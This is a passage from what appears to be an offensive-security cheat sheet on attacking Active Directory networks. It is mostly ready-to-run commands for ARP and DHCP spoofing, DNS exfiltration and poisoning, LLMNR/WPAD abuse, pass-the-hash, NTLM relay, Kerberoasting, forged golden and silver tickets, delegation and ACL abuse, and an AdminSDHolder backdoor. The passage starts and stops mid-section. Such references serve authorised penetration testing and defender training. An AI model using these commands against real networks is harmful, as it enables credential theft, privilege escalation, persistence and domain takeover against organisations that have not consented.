ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "dc=domain,dc=com" "(objectClass=computer)"

# Find groups
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "dc=domain,dc=com" "(objectClass=group)"

# Find SPNs
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "dc=domain,dc=com" "(servicePrincipalName=*)"
```
{% endcode %}

```powershell
# PowerShell ADSI
$searcher = [adsisearcher]"(objectClass=user)"
$searcher.FindAll()

# Active Directory module
Get-ADUser -Filter * -Properties *
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter * -Properties *
```

#### ADWS

Active Directory Web Services - SOAP-based interface (PowerShell remoting).

* Port 9389
* Used by Active Directory module for PowerShell
* Requires AD Web Services role

```powershell
# Uses ADWS by default
Get-ADUser -Server dc.domain.com -Filter *
```

#### Other Protocols

<table><thead><tr><th width="151">Protocol</th><th width="131">Port</th><th>Usage</th></tr></thead><tbody><tr><td><strong>Kerberos</strong></td><td>88</td><td>Authentication, principal enumeration</td></tr><tr><td><strong>DNS</strong></td><td>53</td><td>SRV records, zone transfers</td></tr><tr><td><strong>SMB</strong></td><td>445</td><td>Share enumeration, file access</td></tr><tr><td><strong>RPC</strong></td><td>135</td><td>SAMR, DRSUAPI, LSARPC</td></tr><tr><td><strong>NetBIOS</strong></td><td>137-139</td><td>Legacy name resolution</td></tr></tbody></table>

```bash
# SAMR enumeration (user/group info)
rpcclient -U 'domain/user%password' dc.domain.com
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# SMB enumeration
smbclient -L //dc.domain.com -U 'domain/user%password'
```

***

## Security

Active Directory security relies on multiple layers:

| Layer              | Components                                   |
| ------------------ | -------------------------------------------- |
| **Authentication** | Kerberos, NTLM, certificates                 |
| **Authorization**  | ACLs, privileges, Group Policy               |
| **Encryption**     | TLS/SSL, Kerberos encryption, LDAPS          |
| **Auditing**       | Security event logs, advanced audit policies |
| **Tiering**        | Administrative tier model                    |

***

## Address Resolution

### ARP

Address Resolution Protocol - maps IP addresses to MAC addresses on local networks.

#### ARP Spoof

Redirect traffic by sending fake ARP replies.

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Bettercap
bettercap -iface eth0
» net.probe on
» set arp.spoof.targets 192.168.1.100
» arp.spoof on

# Ettercap
ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# arpspoof
arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1
```

#### ARP Scan

Discover hosts on local network.

```bash
# arp-scan
arp-scan -l
arp-scan 192.168.1.0/24

# Nmap
nmap -PR -sn 192.168.1.0/24

# Netdiscover
netdiscover -i eth0 -r 192.168.1.0/24
```

### DHCP

Dynamic Host Configuration Protocol - assigns IP addresses and network configuration.

#### Rogue DHCP Server

Deploy malicious DHCP server to control client network configuration.

```bash
# Metasploit
use auxiliary/server/dhcp
set SRVHOST 192.168.1.50
set NETMASK 255.255.255.0
set ROUTER 192.168.1.50  # Point to attacker
set DNSSERVER 192.168.1.50  # Point to attacker
run

# Responder (includes rogue DHCP)
responder -I eth0 -d
```

#### DHCP Starvation

Exhaust DHCP pool to enable rogue server.

```bash
# DHCPig
pig.py eth0

# Yersinia
yersinia dhcp -attack 1
```

#### DHCP Discovery

Identify DHCP servers.

```bash
# Nmap
nmap -sU -p 67 --script=dhcp-discover 192.168.1.0/24
```

#### DHCP Dynamic DNS

DHCP can update DNS records (DDNS), potentially allowing DNS poisoning.

### DNS

Domain Name System - critical for AD functionality.

#### DNS Basics

AD integrates DNS for service location:

<table><thead><tr><th width="140">Record Type</th><th width="183">Purpose</th><th>Example</th></tr></thead><tbody><tr><td><strong>A</strong></td><td>Host to IP</td><td><code>dc01.domain.com → 192.168.1.1</code></td></tr><tr><td><strong>AAAA</strong></td><td>Host to IPv6</td><td><code>dc01.domain.com → fe80::1</code></td></tr><tr><td><strong>CNAME</strong></td><td>Alias</td><td><code>mail.domain.com → exchange.domain.com</code></td></tr><tr><td><strong>SRV</strong></td><td>Service location</td><td><code>_ldap._tcp.domain.com</code></td></tr><tr><td><strong>MX</strong></td><td>Mail server</td><td><code>domain.com → mail.domain.com</code></td></tr><tr><td><strong>PTR</strong></td><td>IP to host</td><td><code>1.1.168.192.in-addr.arpa → dc01.domain.com</code></td></tr><tr><td><strong>NS</strong></td><td>Name server</td><td><code>domain.com → dc01.domain.com</code></td></tr><tr><td><strong>SOA</strong></td><td>Zone authority</td><td>Zone metadata</td></tr></tbody></table>

**Critical AD SRV Records:**

```bash
_ldap._tcp.dc._msdcs.<domain>     # Domain Controllers
_kerberos._tcp.<domain>            # Kerberos KDC
_gc._tcp.<forest>                  # Global Catalog
_kpasswd._tcp.<domain>             # Kerberos password change
```

#### DNS Zones

| Zone Type          | Description                            |
| ------------------ | -------------------------------------- |
| **Forward Lookup** | Name to IP resolution                  |
| **Reverse Lookup** | IP to name resolution                  |
| **AD-Integrated**  | Stored in AD, replicated automatically |
| **Primary**        | Authoritative, read-write              |
| **Secondary**      | Copy of primary, read-only             |
| **Stub**           | Contains only NS records               |

#### DNS Exfiltration

Exfiltrate data through DNS queries.

```bash
# DNScat2
dnscat2-server domain.com

# Iodine (DNS tunnel)
iodined -f -c -P password 10.0.0.1 dns.domain.com

# DNSExfiltrator
python dnsexfil.py -d domain.com -f secret.txt
```

#### Fake DNS Server

Respond to DNS queries with malicious answers.

```bash
# Responder
responder -I eth0

# DNSChef
dnschef --interface 192.168.1.50 --fakeip 192.168.1.50

# Bettercap
bettercap -iface eth0
» set dns.spoof.domains target.com
» set dns.spoof.address 192.168.1.50
» dns.spoof on
```

#### DNS Zone Transfer

Request full copy of DNS zone.

```bash
# dig
dig axfr @dc.domain.com domain.com

# nslookup
nslookup
> server dc.domain.com
> set type=any
> ls -d domain.com

# dnsrecon
dnsrecon -d domain.com -t axfr
```

#### Dump DNS Records

Enumerate DNS records.

{% code overflow="wrap" %}
```bash
# DNS enumeration
dnsrecon -d domain.com -t std
dnsenum domain.com

# Fierce
fierce --domain domain.com

# From AD (if joined)
Get-DnsServerResourceRecord -ZoneName "domain.com" -ComputerName dc.domain.com

# LDAP query for AD-integrated zones
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "DC=domain.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=com"

# adidnsdump
adidnsdump -u domain\\user -p password dc.domain.com
```
{% endcode %}

#### ADIDNS

Active Directory Integrated DNS - DNS zones stored in AD.

**Attack vectors:**

* Add DNS records (if user has permissions)
* Modify existing records
* Create wildcard records for LLMNR/NBT-NS style attacks

{% code overflow="wrap" %}
```bash
# Add DNS record (requires CreateChild on zone)
dnstool.py -u 'domain\user' -p 'password' --action add --record attacker --data 192.168.1.50 dc.domain.com

# Query ADIDNS via LDAP
ldapsearch -x -H ldap://dc.domain.com -D "user@domain.com" -w password -b "CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=com"
```
{% endcode %}

#### DNS Dynamic Updates

DNS records can be updated dynamically.

{% code overflow="wrap" %}
```bash
# nsupdate
nsupdate -k Kkey.+157+00000.key
> server dc.domain.com
> update add malicious.domain.com 86400 A 192.168.1.50
> send

# PowerShell (if permitted)
Add-DnsServerResourceRecordA -Name "malicious" -ZoneName "domain.com" -IPv4Address "192.168.1.50"
```
{% endcode %}

### NetBIOS

Legacy name resolution protocol.

#### NetBIOS Datagram Service

Port 138 UDP - broadcasts and datagram messaging.

#### NetBIOS Session Service

Port 139 TCP - session establishment for SMB (legacy).

#### NetBIOS Name Service

Port 137 UDP - name registration and resolution.

```bash
# NBT-NS enumeration
nbtscan 192.168.1.0/24

# nmblookup
nmblookup -A 192.168.1.1

# Nmap
nmap -sU -p 137 --script nbstat 192.168.1.0/24

# NetBIOS name poisoning
responder -I eth0
```

### LLMNR

Link-Local Multicast Name Resolution - resolves names when DNS fails.

* Multicast to 224.0.0.252 (IPv4) / ff02::1:3 (IPv6)
* Port 5355 UDP
* No authentication - vulnerable to spoofing

```bash
# LLMNR poisoning
responder -I eth0

# Inveigh (PowerShell)
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y
```

### mDNS

Multicast DNS - Apple Bonjour, zero-configuration networking.

* Multicast to 224.0.0.251 (IPv4) / ff02::fb (IPv6)
* Port 5353 UDP
* Used for `.local` domain

```bash
# mDNS poisoning
responder -I eth0

# Discover mDNS services
avahi-browse -a
dns-sd -B _services._dns-sd._udp
```

### WPAD

Web Proxy Auto-Discovery - automatic proxy configuration.

**Attack:** Respond to WPAD queries with a malicious proxy.

```bash
# Responder (includes WPAD)
responder -I eth0 -wrf

# Custom WPAD server
# Serve wpad.dat that proxies through attacker

# WPAD file example (wpad.dat)
function FindProxyForURL(url, host) {
    return "PROXY 192.168.1.50:8080";
}
```

***

## Authentication

### GSS-API/SSPI

Generic Security Service API / Security Support Provider Interface - an abstraction layer for authentication.

#### Windows SSPs

Security Support Providers implement authentication protocols.

**Kerberos SSP**

Default for domain authentication.

* Ticket-based
* Mutual authentication
* Requires KDC (Domain Controller)

**NTLM SSP**

Legacy challenge-response authentication.

* Password hash-based
* No mutual authentication
* Works without DC connectivity

**Negotiate SSP**

Negotiates between Kerberos and NTLM.

* Prefers Kerberos
* Falls back to NTLM
* Most common SSP used

**Digest SSP**

HTTP Digest authentication.

* Requires reversible encryption
* Rarely used in AD

**Secure Channel SSP**

SSL/TLS authentication (Schannel).

* Certificate-based
* Machine authentication

**Cred SSP**

Credential delegation for RDP/WinRM.

* Sends credentials to server
* Dangerous if server compromised

**Custom SSPs**

Third-party or malicious SSPs.

* Can capture credentials
* Persistence mechanism

```bash
# Add malicious SSP (persistence)
mimikatz # misc::memssp

# SSP DLL locations
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages
```

### SPNEGO

Simple and Protected GSSAPI Negotiation Mechanism.

* Wraps GSS-API negotiation
* Used by Negotiate SSP
* Seen in HTTP (WWW-Authenticate: Negotiate)

### NTLM

NT LAN Manager - challenge-response authentication protocol.

#### NTLM Basics

**NTLM Authentication Flow:**

1. Client sends NEGOTIATE message (supported features)
2. Server sends CHALLENGE message (random 8/16 byte challenge)
3. Client sends AUTHENTICATE message (response using password hash)

**NTLMv1**

**Security:** Weak, vulnerable to rainbow tables.

```bash
Response = DES(NT_Hash, Challenge)
```

* 24-byte response
* Uses DES with NT hash as key
* Can be cracked to recover NT hash

**NTLMv2**

**Security:** Better, but still relay-vulnerable.

```
Response = HMAC-MD5(NT_Hash, Username + Domain + Challenge + Client_Challenge + Timestamp)
```

* Variable length response
* Includes timestamp (replay protection)
* Username/domain in calculation

**MIC**

Message Integrity Code - prevents relay message tampering.

* HMAC-MD5 of all three NTLM messages
* Optional flag in NTLMv2
* Can be removed by attacker (drop flag)

#### NTLM in Active Directory

NTLM is used when:

* Kerberos unavailable (no DC, IP instead of hostname)
* Legacy systems
* Cross-forest authentication (sometimes)
* Local account authentication

#### NTLM Attacks

**NTLM Recon**

```bash
# Identify NTLM endpoints
nmap -p 445,80,443,5985 --script http-ntlm-info,smb-security-mode 192.168.1.1

# Get NTLM challenge info
crackmapexec smb 192.168.1.1

# HTTP NTLM info
curl -I --ntlm -u : http://target/
```

**NTLM Brute-Force**

```bash
# Spray passwords
crackmapexec smb 192.168.1.1 -u users.txt -p 'Summer2024!' -d domain

# Hydra
hydra -L users.txt -P passwords.txt smb://192.168.1.1

# With hash
crackmapexec smb 192.168.1.1 -u users.txt -H hashes.txt -d domain
```

**Pass the Hash**

Use NT hash directly without cracking.

```bash
# Impacket tools
psexec.py -hashes :NTHASH domain/user@target
wmiexec.py -hashes :NTHASH domain/user@target
smbexec.py -hashes :NTHASH domain/user@target

# CrackMapExec
crackmapexec smb target -u user -H NTHASH -d domain -x "whoami"

# Evil-WinRM
evil-winrm -i target -u user -H NTHASH

# Mimikatz (Windows)
sekurlsa::pth /user:user /domain:domain /ntlm:NTHASH /run:cmd.exe

# Overpass the hash (NTLM to Kerberos)
getTGT.py -hashes :NTHASH domain/user
```

**NTLM Relay**

Relay captured NTLM authentication to another service.

```bash
# Setup relay
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (for delegation attacks)
ntlmrelayx.py -t ldap://dc.domain.com --delegate-access

# Relay to SMB with command execution
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Trigger authentication (printer bug)
printerbug.py domain/user:password@source target_listener

# PetitPotam (no creds needed for some versions)
petitpotam.py listener target

# Trigger with Responder poisoning
responder -I eth0 -rv
ntlmrelayx.py -tf targets.txt -smb2support
```

**NTLM Relay Protections**

| Protection                    | Description              | Bypass                                     |
| ----------------------------- | ------------------------ | ------------------------------------------ |
| **SMB Signing**               | Signs SMB packets        | Cannot relay to SMB signing required hosts |
| **LDAP Signing**              | Signs LDAP packets       | Cannot relay to LDAP                       |
| **LDAP Channel Binding**      | Ties to TLS channel      | Cannot relay to LDAPS                      |
| **EPA (Extended Protection)** | Channel binding for HTTP | Cannot relay across channels               |
| **Session Security**          | NTLMv2 session security  | -                                          |

```bash
# Check SMB signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list nosigning.txt
nmap -p445 --script smb-security-mode 192.168.1.0/24

# Check LDAP signing
crackmapexec ldap dc.domain.com -u user -p pass -M ldap-checker
```

**NTLM Hashes Cracking**

```bash
# Hashcat
hashcat -m 1000 -a 0 hashes.txt rockyou.txt  # NT hash
hashcat -m 5500 -a 0 hashes.txt rockyou.txt  # NTLMv1
hashcat -m 5600 -a 0 hashes.txt rockyou.txt  # NTLMv2

# John
john --format=nt hashes.txt --wordlist=rockyou.txt
john --format=netntlm hashes.txt --wordlist=rockyou.txt
john --format=netntlmv2 hashes.txt --wordlist=rockyou.txt

# Online services (be careful with sensitive hashes)
# crackstation.net, hashes.com
```

### Kerberos

Kerberos is the default authentication protocol in Active Directory.

#### Kerberos Basics

**Kerberos Principals**

Principals identify entities in Kerberos.

<table><thead><tr><th width="132">Format</th><th>Example</th><th>Description</th></tr></thead><tbody><tr><td>User</td><td><code>user@DOMAIN.COM</code></td><td>User principal</td></tr><tr><td>Service</td><td><code>service/host@DOMAIN.COM</code></td><td>Service principal</td></tr><tr><td>SPN</td><td><code>MSSQLSvc/sql.domain.com:1433</code></td><td>Service Principal Name</td></tr></tbody></table>

**Tickets**

Encrypted data structures proving identity.

**PAC**

Privilege Attribute Certificate - embedded in tickets, contains:

* User SID
* Group memberships
* User rights
* Signed by KDC (krbtgt key + service key)

**Kerberos Actors**

| Actor                             | Role                                |
| --------------------------------- | ----------------------------------- |
| **Client**                        | Requests authentication             |
| **KDC (Key Distribution Center)** | Domain Controller, issues tickets   |
| **AS (Authentication Service)**   | Part of KDC, issues TGTs            |
| **TGS (Ticket Granting Service)** | Part of KDC, issues service tickets |
| **Service**                       | Target service                      |

**Ticket Types**

**ST (Service Ticket)**

* Used to access a specific service
* Encrypted with the service account's key
* Contains PAC and session key

**TGT (Ticket Granting Ticket)**

* Used to request service tickets
* Encrypted with the krbtgt account's key
* Proves user identity to KDC

**Ticket Acquisition**

```bash
1. AS-REQ: Client → KDC (username, timestamp encrypted with user key)
2. AS-REP: KDC → Client (TGT encrypted with krbtgt key)
3. TGS-REQ: Client → KDC (TGT + requested service)
4. TGS-REP: KDC → Client (ST encrypted with service key)
5. AP-REQ: Client → Service (ST)
6. AP-REP: Service → Client (optional mutual auth)
```

**Kerberos Services**

| Service  | Port        | Description            |
| -------- | ----------- | ---------------------- |
| kerberos | 88/TCP,UDP  | Main Kerberos protocol |
| kpasswd  | 464/TCP,UDP | Password changes       |

**Kerberos Keys**

| Key Type        | AES-256        | AES-128        | RC4 (NT Hash) |
| --------------- | -------------- | -------------- | ------------- |
| krbtgt          | Golden ticket  | Golden ticket  | Golden ticket |
| Service account | Silver ticket  | Silver ticket  | Silver ticket |
| User            | Authentication | Authentication | Pass the hash |

#### Kerberos Basic Attacks

**Kerberos Brute-Force**

```bash
# Kerbrute
kerbrute bruteuser -d domain.com --dc dc.domain.com passwords.txt username
kerbrute passwordspray -d domain.com --dc dc.domain.com users.txt 'Summer2024!'
kerbrute userenum -d domain.com --dc dc.domain.com users.txt

# Rubeus
Rubeus.exe brute /password:Summer2024! /domain:domain.com

# No pre-auth enumeration (doesn't lock accounts)
GetNPUsers.py domain.com/ -usersfile users.txt -no-pass -dc-ip dc.domain.com
```

**Kerberoast**

Request service tickets for SPNs, crack offline.

```bash
# Impacket
GetUserSPNs.py domain.com/user:password -dc-ip dc.domain.com -request

# Rubeus
Rubeus.exe kerberoast /outfile:hashes.txt

# PowerView
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File hashes.txt

# Crack
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```

**Targeted Kerberoast (set SPN on the user you control):**

```powershell
# Requires GenericAll/GenericWrite on target user
Set-ADUser -Identity targetuser -ServicePrincipalNames @{Add='any/spn'}
```

**ASREProast**

Target accounts without pre-authentication required.

```bash
# Find vulnerable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# Request AS-REP without password
GetNPUsers.py domain.com/ -usersfile users.txt -no-pass -dc-ip dc.domain.com -format hashcat

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack
hashcat -m 18200 -a 0 hashes.txt rockyou.txt
```

**Targeted ASREProast (disable pre-auth on the user you control):**

```powershell
# Requires GenericAll/GenericWrite on target user
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $true
```

**Pass the Key/Over Pass the Hash**

Use Kerberos keys/NT hash to obtain TGT.

```bash
# Request TGT with hash
getTGT.py -hashes :NTHASH domain/user
getTGT.py -aesKey AES256KEY domain/user

# Use TGT
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain/user@target

# Rubeus
Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
Rubeus.exe asktgt /user:user /aes256:AES256KEY /ptt

# Mimikatz
sekurlsa::pth /user:user /domain:domain /ntlm:NTHASH /run:cmd
sekurlsa::pth /user:user /domain:domain /aes256:AES256KEY /run:cmd
```

**Pass the Ticket**

Use stolen Kerberos tickets.

```bash
# Export tickets (Windows)
mimikatz # sekurlsa::tickets /export
Rubeus.exe dump

# Convert ticket formats
ticketConverter.py ticket.kirbi ticket.ccache
ticketConverter.py ticket.ccache ticket.kirbi

# Use ticket (Linux)
export KRB5CCNAME=/path/to/ticket.ccache
klist
psexec.py -k -no-pass domain/user@target

# Use ticket (Windows)
Rubeus.exe ptt /ticket:ticket.kirbi
mimikatz # kerberos::ptt ticket.kirbi
```

**Golden/Silver Ticket**

**Golden Ticket:** Forged TGT using krbtgt hash.

{% code overflow="wrap" %}
```bash
# Get krbtgt hash
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
secretsdump.py domain/admin:password@dc.domain.com -just-dc-user krbtgt

# Create golden ticket
ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-... -domain domain.com administrator
mimikatz # kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:NTHASH /ptt

# With AES keys (harder to detect)
ticketer.py -aesKey KRBTGT_AES256 -domain-sid S-1-5-21-... -domain domain.com administrator
```
{% endcode %}

**Silver Ticket:** Forged ST using service account hash.

{% code overflow="wrap" %}
```bash
# Get service account hash (computer account for HOST/CIFS)
secretsdump.py domain/admin:password@target.domain.com

# Create silver ticket
ticketer.py -nthash SERVICE_NTHASH -domain-sid S-1-5-21-... -domain domain.com -spn cifs/target.domain.com administrator
mimikatz # kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /target:target.domain.com /service:cifs /rc4:NTHASH /ptt

# Common services: cifs, http, mssql, wsman, ldap, host
```
{% endcode %}

#### Kerberos Across Domains

**SID History Attack**

Inject privileged SIDs from another domain into the ticket.

{% code overflow="wrap" %}
```bash
# Golden ticket with extra SIDs (Enterprise Admin)
ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-CHILD... -domain child.domain.com -extra-sid S-1-5-21-PARENT...-519 administrator

mimikatz # kerberos::golden /user:administrator /domain:child.domain.com /sid:S-1-5-21-CHILD... /krbtgt:NTHASH /sids:S-1-5-21-PARENT...-519 /ptt
```
{% endcode %}

**Note:** SID filtering may block this across forest trusts.

**Inter-realm TGT**

Request TGT for parent/trusted domain using trust key.

{% code overflow="wrap" %}
```bash
# Get trust key
mimikatz # lsadump::dcsync /domain:child.domain.com /user:PARENT$
secretsdump.py child.domain.com/admin:password@dc.child.domain.com -just-dc-user 'PARENT$'

# Create inter-realm TGT
ticketer.py -nthash TRUST_KEY -domain-sid S-1-5-21-CHILD... -domain child.domain.com -spn krbtgt/PARENT.DOMAIN.COM administrator

# Then request ST in parent domain using inter-realm TGT
```
{% endcode %}

#### Kerberos Delegation

Delegation allows services to impersonate users to other services.

**Kerberos Anti-Delegation Measures**

| Protection              | Effect                         |
| ----------------------- | ------------------------------ |
| `NOT_DELEGATED` flag    | Account cannot be delegated    |
| `Protected Users` group | No delegation, no NTLM, no DES |
| `Account is sensitive`  | Cannot be delegated            |

```powershell
# Find protected accounts
Get-ADUser -Filter {AccountNotDelegated -eq $true}
Get-ADGroupMember "Protected Users"
```

**Kerberos Unconstrained Delegation**

Service stores user's TGT for any service.

```bash
# Find unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# BloodHound query
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

**Attack:** Coerce privileged user to authenticate, steal TGT.

```bash
# Monitor for tickets on compromised host with unconstrained delegation
Rubeus.exe monitor /interval:1

# Coerce DC authentication (Printer Bug)
SpoolSample.exe dc.domain.com attackerhost.domain.com
printerbug.py domain/user:password@dc.domain.com attackerhost.domain.com

# PetitPotam
PetitPotam.py attackerhost.domain.com dc.domain.com

# Use captured TGT
Rubeus.exe ptt /ticket:base64ticket
```

**Kerberos Unconstrained Delegation Across Forests**

If trust allows TGT delegation, can capture TGTs from users in trusted forest.

**Kerberos Constrained Delegation**

Service can only delegate to specific SPNs.

{% code overflow="wrap" %}
```bash
# Find constrained delegation
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# BloodHound query
MATCH (u)-[:AllowedToDelegate]->(c) RETURN u,c
```
{% endcode %}

**S4U2proxy**

Request ST on behalf of user to allowed service.

**S4U2self**

Request ST to self on behalf of any user (if TRUSTED\_TO\_AUTH\_FOR\_DELEGATION).

**S4U2self and S4U2proxy**

Combined flow for full delegation without user interaction.

**S4U Attacks**

{% code overflow="wrap" %}
```bash
# If you control account with constrained delegation to service
# Request ticket for admin to that service

# getST.py
getST.py -spn cifs/target.domain.com -impersonate administrator domain/serviceaccount:password
export KRB5CCNAME=administrator.ccache

# Rubeus
Rubeus.exe s4u /user:serviceaccount /rc4:NTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.com /ptt
```
{% endcode %}

**Alternative Service Attack:** If delegated to `time/target`, request `cifs/target` instead.

{% code overflow="wrap" %}
```bash
# Service name in ticket isn't validated by all services
Rubeus.exe s4u /user:serviceaccount /rc4:NTHASH /impersonateuser:administrator /msdsspn:time/target.domain.com /altservice:cifs /ptt
```
{% endcode %}

#### Resource-Based Constrained Delegation (RBCD)

Delegation controlled by target service (msDS-AllowedToActOnBehalfOfOtherIdentity).

{% code overflow="wrap" %}
```bash
# If you can write to target's RBCD attribute
# And you control an account with SPN

# Add RBCD
rbcd.py -delegate-from 'controlledaccount$' -delegate-to 'target$' -dc-ip dc.domain.com domain/user:password

# PowerShell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-1234)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-ADComputer target -Replace @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}

# Request ticket
getST.py -spn cifs/target.domain.com -impersonate administrator domain/controlledaccount:password -dc-ip dc.domain.com
```
{% endcode %}

***

## Logon Types

Different logon types have different credential caching behaviour.

| Type | Name              | Credentials Cached           | Description                |
| ---- | ----------------- | ---------------------------- | -------------------------- |
| 2    | Interactive       | Yes (NT hash, Kerberos keys) | Console logon              |
| 3    | Network           | No                           | SMB, authenticated network |
| 4    | Batch             | Yes                          | Scheduled tasks            |
| 5    | Service           | Yes                          | Service startup            |
| 8    | NetworkCleartext  | Yes (plaintext available)    | IIS Basic auth             |
| 9    | NewCredentials    | Current + new                | RunAs /netonly             |
| 10   | RemoteInteractive | Yes                          | RDP                        |
| 11   | CachedInteractive | Domain cached creds          | Offline domain logon       |

### Interactive Logon

Physical/console logon. Credentials cached in LSASS.

### Network Logon

SMB, remote access. Credentials NOT cached on target.

### Batch Logon

Scheduled tasks. Credentials may be stored.

### Service Logon

Service accounts. Credentials cached.

### NetworkCleartext Logon

Plaintext over network (IIS Basic). Credentials cached in plaintext.

### NewCredentials Logon

`runas /netonly`. Current token locally, different creds for network.

### RemoteInteractive Logon

RDP. Full credentials cached unless Restricted Admin/Remote Credential Guard.

***

## Authorization

### ACLs

Access Control Lists determine who can access/modify objects.

#### Security Descriptor

Contains:

* **Owner**: Who owns the object
* **DACL**: Discretionary ACL (permissions)
* **SACL**: System ACL (auditing)

#### ACEs

Access Control Entries - individual permission rules.

| ACE Type | Description       |
| -------- | ----------------- |
| Allow    | Grants permission |
| Deny     | Explicitly denies |

#### Rights

<table><thead><tr><th width="216">Right</th><th width="206">Description</th><th>Attack Use</th></tr></thead><tbody><tr><td><strong>GenericAll</strong></td><td>Full control</td><td>Modify anything</td></tr><tr><td><strong>GenericWrite</strong></td><td>Write properties</td><td>Modify SPNs, delegation</td></tr><tr><td><strong>WriteProperty</strong></td><td>Write specific property</td><td>Targeted modification</td></tr><tr><td><strong>WriteDacl</strong></td><td>Modify ACL</td><td>Grant yourself GenericAll</td></tr><tr><td><strong>WriteOwner</strong></td><td>Change owner</td><td>Take ownership, then WriteDacl</td></tr><tr><td><strong>Self</strong></td><td>Modify self</td><td>Add self to group</td></tr><tr><td><strong>AllExtendedRights</strong></td><td>All extended rights</td><td>Reset password, read LAPS</td></tr><tr><td><strong>ForceChangePassword</strong></td><td>Reset password</td><td>Take over account</td></tr><tr><td><strong>AddMember</strong></td><td>Add to group</td><td>Add self to privileged group</td></tr><tr><td><strong>ReadLAPSPassword</strong></td><td>Read LAPS</td><td>Get local admin password</td></tr></tbody></table>

```bash
# Enumerate ACLs
Import-Module ActiveDirectory
(Get-Acl "AD:CN=user,CN=Users,DC=domain,DC=com").Access

# BloodHound
# Shows attack paths via ACL abuse

# PowerView
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs
```

#### ACL Attacks

<table><thead><tr><th width="203">Attack</th><th width="185">Required Right</th><th>Action</th></tr></thead><tbody><tr><td>Force password reset</td><td>ForceChangePassword</td><td><code>Set-ADAccountPassword</code></td></tr><tr><td>Add to group</td><td>AddMember/Self</td><td><code>Add-ADGroupMember</code></td></tr><tr><td>Set SPN (Kerberoast)</td><td>GenericWrite</td><td><code>Set-ADUser -ServicePrincipalNames</code></td></tr><tr><td>Disable pre-auth</td><td>GenericWrite</td><td><code>Set-ADAccountControl -DoesNotRequirePreAuth</code></td></tr><tr><td>Configure delegation</td><td>GenericWrite</td><td>Set delegation attributes</td></tr><tr><td>DCSync</td><td>Replicating Directory Changes (All)</td><td><code>secretsdump.py</code>, <code>mimikatz dcsync</code></td></tr><tr><td>Shadow Credentials</td><td>GenericWrite on computer</td><td>Add msDS-KeyCredentialLink</td></tr></tbody></table>

{% code overflow="wrap" %}
```bash
# Force password change
net user targetuser NewPassword123! /domain
Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# Add to group
Add-ADGroupMember -Identity "Domain Admins" -Members attacker

# Shadow Credentials attack
certipy shadow auto -u user@domain.com -p password -account targetcomputer$
pywhisker.py -d domain.com -u user -p password --target targetcomputer$ --action add
```
{% endcode %}

**AdminSDHolder**

Protects privileged accounts by resetting ACLs every 60 minutes.

{% code overflow="wrap" %}
```bash
# Find AdminSDHolder-protected objects
Get-ADObject -Filter {adminCount -eq 1}

# Backdoor: Add ACE to AdminSDHolder, propagates to all protected objects
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity attacker -Rights All
```
{% endcode %}

### Privileges

User rights assigned via Group Policy.

| Privilege                         | Risk     | Attack                              |
| --------------------------------- | -------- | ----------------------------------- |
| **SeBackupPrivilege**             | High     | Backup files, read DC database      |
| **SeRestorePrivilege**            | High     | Restore files, write anywhere       |
| **SeTakeOwnershipPrivilege**      | High     | Take ownership of any object        |
| **SeDebugPrivilege**              | Critical | Debug processes (inject into LSASS) |
| **SeImpersonatePrivilege**        | Critical | Impersonate tokens (Potato attacks) |
| **SeAssignPrimaryTokenPrivilege** | Critical | Assign process tokens               |
| **SeLoadDriverPrivilege**         | Critical | Load kernel drivers                 |
| **SeTcbPrivilege**                | Critical | Act as part of OS                   |
| **SeEnableDelegationPrivilege**   | High     | Configure delegation                |

{% code overflow="wrap" %}
```bash
# Check privileges
whoami /priv

